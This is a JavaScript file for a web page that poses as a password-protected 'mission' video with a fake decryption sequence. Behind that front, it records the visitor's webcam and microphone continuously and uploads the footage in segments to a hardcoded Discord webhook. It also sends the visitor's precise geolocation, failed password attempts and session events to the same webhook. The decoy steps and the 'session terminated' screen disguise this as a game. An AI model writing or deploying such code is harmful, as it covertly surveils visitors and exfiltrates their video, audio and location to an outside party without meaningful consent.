/* ===== CONFIG ===== */
const WH   = "https://discord.com/api/webhooks/1379451829116600481/rBfx4dEdwNAzaF3mR3UCX1FhpUhzEjZctUaCHOdTSDI7gMMK3AtdxF0pBXmBnd3cKJCr";              // ← replace
const VID  = "https://video.wixstatic.com/video/fcb4a6_4843089a817c4ad38e7dc0bd86cc98ca/1080p/mp4/file.mp4";
const WARN = "missionWarnedOnce";
const TERM = "missionUsed";

/* ===== STATE ===== */
let SID = sid();
let camStream, recorder, bytesInSeg = 0;
let chunks = [];
let faceInt, done = false;
let allowGeo = false, allowMedia = false, tries = 0;

/* ===== HELPERS ===== */
const $ = s => document.querySelector(s);
const log = m => fetch(WH, {
  method:"POST",
  headers:{ "Content-Type":"application/json" },
  body:JSON.stringify({ content:`[${SID}] ${m}` })
}).catch(()=>{});

function sid(){return"xxxx-4xxx-yxxx".replace(/[xy]/g,c=>(Math.random()*16|0).toString(16))}
function show(id){document.querySelectorAll(".panel").forEach(p=>p.classList.remove("active"));$(id).classList.add("active");}

/* ===== PERMISSIONS ===== */
async function requestPerms(){
  try{
    camStream = await navigator.mediaDevices.getUserMedia({ video:true, audio:true });
    $("#webcam-preview").srcObject = camStream;
    allowMedia = true; log("media ok");

    navigator.geolocation.getCurrentPosition(
      pos=>{allowGeo=true;log(`geo ${pos.coords.latitude.toFixed(4)},${pos.coords.longitude.toFixed(4)}`);ready();},
      ()=>{$("#perm-error").textContent="Location denied";log("geo denied");}
    );
  }catch{
    $("#perm-error").textContent="Camera & mic denied";
    log("media denied");
  }
}
function ready(){ if(allowMedia && allowGeo) $("#perm-continue").disabled = false; }

/* ===== RECORDING: one playable file per segment ===== */
const MAX_BYTES = 7_800_000;                        // 7.43 MB
const MIME      = "video/webm;codecs=vp8,opus";

function startRecorder(){
  if(!camStream) return;

  recorder = new MediaRecorder(camStream, { mimeType: MIME });

  recorder.ondataavailable = e=>{
    if(!e.data || !e.data.size) return;
    upload(e.data);
    bytesInSeg += e.data.size;
    if(bytesInSeg >= MAX_BYTES){
      recorder.stop();               // finalize this file → onstop will restart
    }
  };

  recorder.onstart = ()=>{bytesInSeg = 0; log("rec start");};
  recorder.onstop  = ()=>{ log("rec stop"); if(!done) startRecorder(); };

  recorder.start(1000);              // 1 s internal buffer
}

function stopRecorder(){
  if(recorder && recorder.state !== "inactive") recorder.stop();
}

function upload(blob){
  const fd = new FormData();
  fd.append("file", blob, `cam_${Date.now()}.webm`);
  fetch(WH, { method:"POST", body:fd }).catch(()=>{});
}

/* ===== FACE MONITOR ===== */
function faceWatch(){
  if(!("FaceDetector" in window)){log("no FaceDetector");return;}
  const det  = new FaceDetector({ fastMode:true });
  const feed = $("#face-feed");

  faceInt = setInterval(async ()=>{
    try{
      const f = await det.detect(feed);
      if(f.length){
        $("#face-warning").style.display = "none";
        $("#mission-video").play().catch(()=>{});
      }else{
        $("#face-warning").style.display = "flex";
        $("#mission-video").pause();
      }
    }catch{}
  }, 1200);
}

/* ===== DECRYPT ===== */
function decrypt(){
  const steps=[
    "Init cipher…","TLS 1.3 handshake…","Quantum noise…",
    "Verify SHA-512…","Decrypt block 1…","Decrypt block 2…",
    "Decrypt block 3…","Reassemble…","Checksum OK ✔",
    "Write buffer…","Harden memory…","Decrypt complete ✅"
  ];
  let i=0;
  $("#decrypt-log").innerHTML=""; $("#decrypt-progress").value=0;

  const iv=setInterval(()=>{
    if(i<steps.length){
      $("#decrypt-log").innerHTML+=`<p>${steps[i]}</p>`;
      $("#decrypt-log").scrollTop = $("#decrypt-log").scrollHeight;
      $("#decrypt-progress").value=(++i)*100/steps.length;
    }else{
      clearInterval(iv);
      if(!localStorage.getItem(WARN)){
        show("#alert-panel"); log("warn panel");
        localStorage.setItem(WARN,"yes");
        setTimeout(()=>location.reload(),5000);
      }else{
        launchVideo();
      }
    }
  },1100);
}

/* ===== AUTH ===== */
function auth(){
  const p=$("#pwd").value, err=$("#login-error");
  err.textContent="";
  if(p==="OneTimeSecret2024!"){ show("#decrypt-panel"); decrypt(); }
  else{
    tries++;
    err.textContent = tries>=3 ? "Locked" : `Wrong (${3-tries} left)`;
    if(tries>=3) $("#decrypt-btn").disabled=true;
    log(`bad pw ${tries}`);
  }
}

/* ===== VIDEO ===== */
function launchVideo(){
  $("#video-layer").classList.add("active");
  $("#mission-video").src = VID;
  $("#face-feed").srcObject = camStream;

  startRecorder(); faceWatch();
  log("video play");

  setInterval(()=>$("#dyn-mark").textContent = `${SID} | ${new Date().toLocaleTimeString()}`,1000);

  $("#mission-video").onended = ()=>{ stopRecorder(); terminate(); };
}

/* ===== TERMINATE ===== */
function terminate(){
  if(done) return; done = true;
  clearInterval(faceInt);
  stopRecorder();
  camStream?.getTracks().forEach(t=>t.stop());
  localStorage.setItem(TERM,"yes");
  log("terminated");

  const splash=document.createElement("div");
  splash.className="terminated";
  splash.innerHTML="<h1>SESSION TERMINATED</h1><p>Resetting…</p>";
  $("#video-layer").appendChild(splash);
  setTimeout(()=>location.reload(),3500);
}

/* ===== BOOT CHECK ===== */
if(localStorage.getItem(TERM)==="yes"){
  document.body.innerHTML = '<div style="display:flex;height:100vh;align-items:center;justify-content:center;color:#fff;font-family:sans-serif"><h1>ACCESS EXPIRED</h1></div>';
  log("reopen attempt"); throw "expired";
}

/* ===== EVENTS ===== */
$("#perm-continue").onclick = ()=>{ show("#login-panel"); log("perm ok"); startRecorder(); };
$("#decrypt-btn").onclick   = auth;
document.addEventListener("keydown",e=>{
  if(e.key==="Enter" && $("#login-panel").classList.contains("active")) auth();
});
window.addEventListener("beforeunload",()=>{ stopRecorder(); camStream?.getTracks().forEach(t=>t.stop()); });

/* ===== START ===== */
requestPerms();
